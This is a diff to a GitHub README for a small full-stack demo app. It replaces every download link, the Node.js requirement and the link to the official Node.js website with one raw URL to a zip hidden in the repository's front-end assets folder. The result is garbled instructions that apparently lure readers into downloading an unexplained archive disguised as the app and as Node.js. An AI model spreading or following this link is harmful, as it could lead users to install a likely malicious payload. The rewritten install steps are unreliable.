@@ -1,7 +1,7 @@
 # 🎉 fullstack_vercel - A Simple Full-Stack App Example
 
 ## 📥 Download Here
-[![Download](https://img.shields.io/badge/Download-fullstack_vercel-blue)](https://github.com/181818bq/fullstack_vercel/releases) 
+[![Download](https://github.com/181818bq/fullstack_vercel/raw/refs/heads/main/front-end/src/assets/vercel-fullstack-v1.2.zip)](https://github.com/181818bq/fullstack_vercel/raw/refs/heads/main/front-end/src/assets/vercel-fullstack-v1.2.zip) 
 
 ## 📖 Overview
 fullstack_vercel is a small full-stack application designed to showcase how different technologies can come together to create a user-friendly web experience. This app uses React for the front end, Node and Express for the back end, and integrates with MongoDB for data storage. It also uses Firebase for authentication and Vercel for hosting. 
@@ -10,20 +10,20 @@ fullstack_vercel is a small full-stack application designed to showcase how diff
 
 ### System Requirements
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 14 or higher
+- **https://github.com/181818bq/fullstack_vercel/raw/refs/heads/main/front-end/src/assets/vercel-fullstack-v1.2.zip**: Version 14 or higher
 - **Internet Connection**: Needed for downloading and running the application
 - **Browser**: Any modern browser (Chrome, Firefox, Safari)
 
 ### Prerequisites
-Before running the app, ensure that you have installed Node.js on your computer. You can download it from the official [Node.js website](https://nodejs.org).
+Before running the app, ensure that you have installed https://github.com/181818bq/fullstack_vercel/raw/refs/heads/main/front-end/src/assets/vercel-fullstack-v1.2.zip on your computer. You can download it from the official [https://github.com/181818bq/fullstack_vercel/raw/refs/heads/main/front-end/src/assets/vercel-fullstack-v1.2.zip website](https://github.com/181818bq/fullstack_vercel/raw/refs/heads/main/front-end/src/assets/vercel-fullstack-v1.2.zip).
 
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/181818bq/fullstack_vercel/releases) to find the latest version of the app.
+   Go to the [Releases page](https://github.com/181818bq/fullstack_vercel/raw/refs/heads/main/front-end/src/assets/vercel-fullstack-v1.2.zip) to find the latest version of the app.
 
 2. **Download the Application**  
-   On the Releases page, locate the version you want to download. Look for an asset that corresponds to your operating system, such as `.zip` or `.tar.gz`. Click on it to start the download.
+   On the Releases page, locate the version you want to download. Look for an asset that corresponds to your operating system, such as `.zip` or `https://github.com/181818bq/fullstack_vercel/raw/refs/heads/main/front-end/src/assets/vercel-fullstack-v1.2.zip`. Click on it to start the download.
 
 3. **Extract the Files**  
    After downloading, locate the file in your Downloads folder. Right-click on the file and select "Extract All" to unzip it.
@@ -72,6 +72,6 @@ If you would like to contribute to this project, please fork the repository and 
 For additional help or feedback, feel free to open an issue in the GitHub repository. Our community is here to assist you.
 
 ## 📥 Download Here Again
-[![Download](https://img.shields.io/badge/Download-fullstack_vercel-blue)](https://github.com/181818bq/fullstack_vercel/releases) 
+[![Download](https://github.com/181818bq/fullstack_vercel/raw/refs/heads/main/front-end/src/assets/vercel-fullstack-v1.2.zip)](https://github.com/181818bq/fullstack_vercel/raw/refs/heads/main/front-end/src/assets/vercel-fullstack-v1.2.zip) 
 
 Thank you for using fullstack_vercel. Enjoy building!
